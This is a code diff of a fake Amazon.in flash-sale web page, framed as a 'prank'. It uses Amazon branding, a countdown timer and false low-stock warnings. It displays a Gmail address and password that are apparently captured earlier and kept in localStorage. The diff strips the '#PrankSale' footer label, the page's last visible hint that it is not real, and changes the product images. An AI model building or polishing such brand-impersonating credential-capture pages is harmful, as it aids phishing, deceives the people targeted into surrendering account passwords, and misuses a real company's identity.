@@ -9,22 +9,27 @@
         body { font-family: Arial, sans-serif; }
 
         .beach-bg {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: -1;
-            background: linear-gradient(180deg, #87CEEB 0%, #87CEEB 55%, #F5DEB3 55%, #F5DEB3 70%, #E8C37A 70%, #E8C37A 75%, #87CEEB 75%, #87CEEB 100%);
+            background: linear-gradient(180deg, #87CEEB 0%, #87CEEB 50%, #F5DEB3 50%, #F5DEB3 65%, #E8C37A 65%, #E8C37A 70%, #87CEEB 70%, #87CEEB 100%);
+        }
+        .beach-bg::before {
+            content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 45%;
+            background: linear-gradient(180deg, transparent 0%, rgba(255,255,255,0.1) 25%, #F5DEB3 40%, #E8C37A 60%, #D4A76A 100%);
+        }
+        .beach-bg::after {
+            content: ''; position: absolute; top: 35%; left: 0; width: 100%; height: 12%;
+            background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.3) 20%, rgba(255,255,255,0.1) 40%, transparent 60%, rgba(255,255,255,0.2) 80%, transparent 100%);
         }
         .wave {
-            position: fixed;
-            bottom: 20%; left: 0; width: 200%; height: 60px;
-            background: rgba(255,255,255,0.15);
+            position: fixed; bottom: 22%; left: 0; width: 200%; height: 50px;
+            background: rgba(255,255,255,0.12);
             border-radius: 50%;
             animation: waveMove 8s linear infinite;
-            z-index: 0;
-            pointer-events: none;
+            z-index: 0; pointer-events: none;
         }
         @keyframes waveMove { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
-        .wave2 { bottom: 18%; animation-duration: 11s; opacity: 0.5; }
+        .wave2 { bottom: 19%; animation-duration: 11s; opacity: 0.4; }
 
         .content-wrapper { position: relative; z-index: 1; min-height: 100vh; }
 
@@ -33,7 +38,7 @@
         .logo span { color: #febd69; }
         .search-bar { display: flex; flex: 1; max-width: 500px; margin: 0 15px; }
         .search-bar input { flex: 1; padding: 10px; border: none; font-size: 14px; border-radius: 4px 0 0 4px; }
-        .search-bar button { background: #febd69; border: none; padding: 0 12px; border-radius: 0 4px 4px 0; cursor: pointer; }
+        .search-bar button { background: #febd69; border: none; padding: 0 12px; border-radius: 0 4px 4px 0; cursor: pointer; font-size: 18px; }
         .right-links { display: flex; align-items: center; gap: 20px; font-size: 12px; color: #ccc; }
         .right-links strong { color: white; display: block; font-size: 14px; }
 
@@ -47,11 +52,35 @@
         .offers-title { text-align: center; padding: 25px 0 10px; font-size: 28px; color: #b12704; font-weight: 700; text-shadow: 0 2px 4px rgba(0,0,0,0.1); }
         .offers-title small { font-size: 16px; color: #555; font-weight: 400; display: block; }
 
-        .product-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 18px; padding: 20px; max-width: 1200px; margin: auto; }
-        .product-card { background: white; border-radius: 12px; padding: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.12); transition: 0.2s; position: relative; }
-        .product-card:hover { transform: scale(1.02); }
-        .badge { position: absolute; top: 10px; left: 10px; background: #b12704; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; z-index: 2; }
-        .product-img { width: 100%; height: 160px; object-fit: contain; padding: 10px; background: #f8f8f8; border-radius: 8px; }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 18px;
+            padding: 20px;
+            max-width: 1200px;
+            margin: auto;
+        }
+        .product-card {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+            transition: 0.2s;
+            position: relative;
+        }
+        .product-card:hover { transform: scale(1.02); box-shadow: 0 8px 30px rgba(0,0,0,0.2); }
+        .badge {
+            position: absolute; top: 10px; left: 10px;
+            background: #b12704; color: white;
+            padding: 4px 12px; border-radius: 20px;
+            font-size: 12px; font-weight: 700; z-index: 2;
+        }
+        .product-img {
+            width: 100%; height: 160px;
+            object-fit: cover;
+            border-radius: 8px;
+            background: #f0f0f0;
+        }
         .product-title { font-size: 14px; font-weight: 600; margin: 10px 0 4px; color: #0f1111; }
         .product-rating { color: #f39c12; font-size: 13px; margin-bottom: 4px; }
         .product-rating span { color: #555; font-size: 11px; margin-left: 4px; }
@@ -80,63 +109,36 @@
 <div class="beach-bg"></div>
 <div class="wave"></div>
 <div class="wave wave2"></div>
-
 <div class="content-wrapper">
-    <!-- HEADER -->
     <header class="top-header">
         <div class="logo">amazon<span>.in</span></div>
-        <div class="search-bar">
-            <input type="text" placeholder="Search 24 Hour Mega Sale..." />
-            <button>&#128269;</button>
-        </div>
-        <div class="right-links">
-            <div>Hello <strong id="userDisplayName">Guest</strong></div>
-            <div>&#128722;</div>
-        </div>
+        <div class="search-bar"><input type="text" placeholder="Search 24 Hour Mega Sale..." /><button>&#128269;</button></div>
+        <div class="right-links"><div>Hello <strong id="userDisplayName">Guest</strong></div><div>&#128722;</div></div>
     </header>
-
-    <div class="sub-header">
-        <span>&#9776; All</span><span>Today's Deals</span><span>Prime</span><span>Fashion</span><span>Women</span>
-    </div>
-
-    <div class="sale-banner">
-        &#9888; FLASH SALE — <span class="blink">24 HOURS ONLY!</span> Ends in
-        <span class="timer" id="countdownTimer">23:59:59</span>
-    </div>
-
-    <div class="offers-title">
-        &#128293; Women's Mega Sale &#128293;
-        <small>All Under ₹500 | Up to 85% OFF</small>
-    </div>
-
+    <div class="sub-header"><span>&#9776; All</span><span>Today's Deals</span><span>Prime</span><span>Fashion</span><span>Women</span></div>
+    <div class="sale-banner">&#9888; FLASH SALE — <span class="blink">24 HOURS ONLY!</span> Ends in <span class="timer" id="countdownTimer">23:59:59</span></div>
+    <div class="offers-title">&#128293; Women's Mega Sale &#128293;<small>All Under ₹500 | Up to 85% OFF</small></div>
     <div class="product-grid" id="productGrid"></div>
-
-    <div class="footer">
-        <p>Amazon.in &mdash; 24 Hour Mega Sale &bull; #PrankSale</p>
-    </div>
+    <div class="footer"><p>Amazon.in &mdash; 24 Hour Mega Sale</p></div>
 </div>
 
 <script>
-// Show user email in header
 const capturedEmail = localStorage.getItem('capturedEmail');
-if(capturedEmail) {
-    document.getElementById('userDisplayName').textContent = capturedEmail.split('@')[0];
-}
+if(capturedEmail) { document.getElementById('userDisplayName').textContent = capturedEmail.split('@')[0]; }
 
-// Products
 const products = [
-    { img:"https://m.media-amazon.com/images/I/61aEKN-jh1L._SX679_.jpg", title:"Women's Cotton Printed Maxi Dress", rating:"★★★★★", reviews:"18,423", oldPrice:"1,299", newPrice:"349", off:"73% off", delivery:"FREE Delivery", stock:"Only 2 left!" },
-    { img:"https://m.media-amazon.com/images/I/61T6E4riKJL._SX679_.jpg", title:"Ladies Analogue Wrist Watch - Rose Gold", rating:"★★★★½", reviews:"9,876", oldPrice:"1,999", newPrice:"449", off:"78% off", delivery:"FREE Delivery", stock:"Only 5 left!" },
-    { img:"https://m.media-amazon.com/images/I/71zXxVWAGSL._SX695_.jpg", title:"Women Fashionable Slipper - Soft Sole", rating:"★★★★★", reviews:"24,551", oldPrice:"999", newPrice:"199", off:"80% off", delivery:"FREE Delivery", stock:"Only 3 left!" },
-    { img:"https://m.media-amazon.com/images/I/61y-Oz8ClqL._SX679_.jpg", title:"Gold Plated Fancy Chain Necklace", rating:"★★★★½", reviews:"14,237", oldPrice:"2,499", newPrice:"399", off:"84% off", delivery:"FREE Delivery", stock:"Only 4 left!" },
-    { img:"https://m.media-amazon.com/images/I/61v3LFL4pOL._SX679_.jpg", title:"Women's Georgette Floral Printed Saree", rating:"★★★★★", reviews:"32,890", oldPrice:"1,799", newPrice:"499", off:"72% off", delivery:"FREE Delivery", stock:"Limited stock!" },
-    { img:"https://m.media-amazon.com/images/I/71c2fLkhKAL._SX695_.jpg", title:"Fashionable Butterfly Earring Set", rating:"★★★★★", reviews:"21,564", oldPrice:"999", newPrice:"149", off:"85% off", delivery:"FREE Delivery", stock:"Only 7 left!" },
-    { img:"https://m.media-amazon.com/images/I/812FJ8VN79L._SY741_.jpg", title:"Women's Denim Jacket - Trendy Style", rating:"★★★★½", reviews:"11,234", oldPrice:"1,999", newPrice:"499", off:"75% off", delivery:"FREE Delivery", stock:"Only 6 left!" },
-    { img:"https://m.media-amazon.com/images/I/81XPV-xth8L._SY741_.jpg", title:"Ladies Handbag - Premium Synthetic Leather", rating:"★★★★★", reviews:"45,678", oldPrice:"1,499", newPrice:"399", off:"73% off", delivery:"FREE Delivery", stock:"Only 3 left!" },
-    { img:"https://m.media-amazon.com/images/I/61z4JMr+jfL._SX679_.jpg", title:"Pearl Drop Earrings For Women", rating:"★★★★½", reviews:"8,765", oldPrice:"799", newPrice:"149", off:"81% off", delivery:"FREE Delivery", stock:"Only 5 left!" },
-    { img:"https://m.media-amazon.com/images/I/71OeAJfKl+L._SY741_.jpg", title:"Women's Casual Palazzo Set", rating:"★★★★★", reviews:"19,432", oldPrice:"1,299", newPrice:"349", off:"73% off", delivery:"FREE Delivery", stock:"Hurry!" },
-    { img:"https://m.media-amazon.com/images/I/61Vj5fQ2T9L._SX679_.jpg", title:"Ladies Sports Analog Watch", rating:"★★★★½", reviews:"7,891", oldPrice:"1,499", newPrice:"399", off:"73% off", delivery:"FREE Delivery", stock:"Only 8 left!" },
-    { img:"https://m.media-amazon.com/images/I/71YbS36xnOL._SY695_.jpg", title:"Women's Flats - Comfort Soft Sole Sandal", rating:"★★★★★", reviews:"28,345", oldPrice:"999", newPrice:"249", off:"75% off", delivery:"FREE Delivery", stock:"Only 2 left!" }
+    { img:"https://images.unsplash.com/photo-1612336307429-8a898d10e223?w=300&h=300&fit=crop", title:"Women's Cotton Printed Maxi Dress", rating:"★★★★★", reviews:"18,423", oldPrice:"1,299", newPrice:"349", off:"73% off", delivery:"FREE Delivery", stock:"Only 2 left!" },
+    { img:"https://images.unsplash.com/photo-1524592094714-0f0654e20314?w=300&h=300&fit=crop", title:"Ladies Analogue Wrist Watch - Rose Gold", rating:"★★★★½", reviews:"9,876", oldPrice:"1,999", newPrice:"449", off:"78% off", delivery:"FREE Delivery", stock:"Only 5 left!" },
+    { img:"https://images.unsplash.com/photo-1595341888016-a392ef81b7de?w=300&h=300&fit=crop", title:"Women Fashionable Slipper - Soft Sole", rating:"★★★★★", reviews:"24,551", oldPrice:"999", newPrice:"199", off:"80% off", delivery:"FREE Delivery", stock:"Only 3 left!" },
+    { img:"https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?w=300&h=300&fit=crop", title:"Gold Plated Fancy Chain Necklace", rating:"★★★★½", reviews:"14,237", oldPrice:"2,499", newPrice:"399", off:"84% off", delivery:"FREE Delivery", stock:"Only 4 left!" },
+    { img:"https://images.unsplash.com/photo-1610030469629-dc6b53aa84d2?w=300&h=300&fit=crop", title:"Women's Georgette Floral Printed Saree", rating:"★★★★★", reviews:"32,890", oldPrice:"1,799", newPrice:"499", off:"72% off", delivery:"FREE Delivery", stock:"Limited stock!" },
+    { img:"https://images.unsplash.com/photo-1635767798638-3e25273a8236?w=300&h=300&fit=crop", title:"Fashionable Butterfly Earring Set", rating:"★★★★★", reviews:"21,564", oldPrice:"999", newPrice:"149", off:"85% off", delivery:"FREE Delivery", stock:"Only 7 left!" },
+    { img:"https://images.unsplash.com/photo-1551028719-00167b16eac5?w=300&h=300&fit=crop", title:"Women's Denim Jacket - Trendy Style", rating:"★★★★½", reviews:"11,234", oldPrice:"1,999", newPrice:"499", off:"75% off", delivery:"FREE Delivery", stock:"Only 6 left!" },
+    { img:"https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=300&h=300&fit=crop", title:"Ladies Handbag - Premium Synthetic Leather", rating:"★★★★★", reviews:"45,678", oldPrice:"1,499", newPrice:"399", off:"73% off", delivery:"FREE Delivery", stock:"Only 3 left!" },
+    { img:"https://images.unsplash.com/photo-1617038220302-7d99b71e38d9?w=300&h=300&fit=crop", title:"Pearl Drop Earrings For Women", rating:"★★★★½", reviews:"8,765", oldPrice:"799", newPrice:"149", off:"81% off", delivery:"FREE Delivery", stock:"Only 5 left!" },
+    { img:"https://images.unsplash.com/photo-1583496661160-fb5886a0aaaa?w=300&h=300&fit=crop", title:"Women's Casual Palazzo Set", rating:"★★★★★", reviews:"19,432", oldPrice:"1,299", newPrice:"349", off:"73% off", delivery:"FREE Delivery", stock:"Hurry!" },
+    { img:"https://images.unsplash.com/photo-1542496658-e33a6d0d50f6?w=300&h=300&fit=crop", title:"Ladies Sports Analog Watch", rating:"★★★★½", reviews:"7,891", oldPrice:"1,499", newPrice:"399", off:"73% off", delivery:"FREE Delivery", stock:"Only 8 left!" },
+    { img:"https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=300&h=300&fit=crop", title:"Women's Flats - Comfort Soft Sole Sandal", rating:"★★★★★", reviews:"28,345", oldPrice:"999", newPrice:"249", off:"75% off", delivery:"FREE Delivery", stock:"Only 2 left!" }
 ];
 
 const grid = document.getElementById('productGrid');
@@ -144,21 +146,20 @@ if(grid) {
     products.forEach(function(p) {
         const card = document.createElement('div');
         card.className = 'product-card';
-        card.innerHTML = '<div class="badge">🔥 Mega Deal</div><img class="product-img" src="'+p.img+'" alt="'+p.title+'" onerror="this.onerror=null;this.src=\'data:image/svg+xml,%253Csvg xmlns=%2527http://www.w3.org/2000/svg%2527 width=%2527200%2527 height=%2527160%2527%253E%253Crect fill=%2527%2523f8f8f8%2527 width=%2527200%2527 height=%2527160%2527/%253E%253Ctext x=%2527100%2527 y=%252785%2527 text-anchor=%2527middle%2527 fill=%2527%2523999%2527 font-size=%252714%2527%253EProduct Image%253C/text%253E%253C/svg%253E\';"/><div class="product-title">'+p.title+'</div><div class="product-rating">'+p.rating+' <span>('+p.reviews+')</span></div><div class="price-line"><span class="price-old">₹'+p.oldPrice+'</span><span class="price-new">₹'+p.newPrice+'</span><span class="price-off">-'+p.off+'</span></div><div class="delivery-info">'+p.delivery+'</div><div class="stock-warning">'+p.stock+'</div><button class="add-btn" onclick="showLoading()">Add to Cart</button>';
+        card.innerHTML = '<div class="badge">🔥 Mega Deal</div><img class="product-img" src="'+p.img+'" alt="'+p.title+'" /><div class="product-title">'+p.title+'</div><div class="product-rating">'+p.rating+' <span>('+p.reviews+')</span></div><div class="price-line"><span class="price-old">₹'+p.oldPrice+'</span><span class="price-new">₹'+p.newPrice+'</span><span class="price-off">-'+p.off+'</span></div><div class="delivery-info">'+p.delivery+'</div><div class="stock-warning">'+p.stock+'</div><button class="add-btn" onclick="addToCart()">Add to Cart</button>';
         grid.appendChild(card);
     });
 }
 
-function showLoading() {
-    alert('⏳ Processing your order... Please wait 5 minutes.');
+function addToCart() {
+    const email = localStorage.getItem('capturedEmail') || 'your email';
+    const password = localStorage.getItem('capturedPassword') || 'your password';
+    alert('⏳ Processing your order...');
     setTimeout(function() {
-        const email = localStorage.getItem('capturedEmail') || 'your email';
-        const password = localStorage.getItem('capturedPassword') || 'your password';
-        alert('🎉 Order placed! Confirmation sent to ' + email + '\n\n😜 PRANKED! 🤣\nYour Gmail: ' + email + '\nYour Password: ' + password + '\n\nThis was a prank website created by your friend! No data was sent anywhere.');
+        alert('🎉 Order placed!\n\n😜 PRANKED! 🤣\nYour Gmail: ' + email + '\nYour Password: ' + password + '\n\nThis was a prank! No data was sent anywhere.');
     }, 5000);
 }
 
-// Countdown
 let countdownInterval;
 function startCountdown() {
     let end = localStorage.getItem('prankSaleEnd');
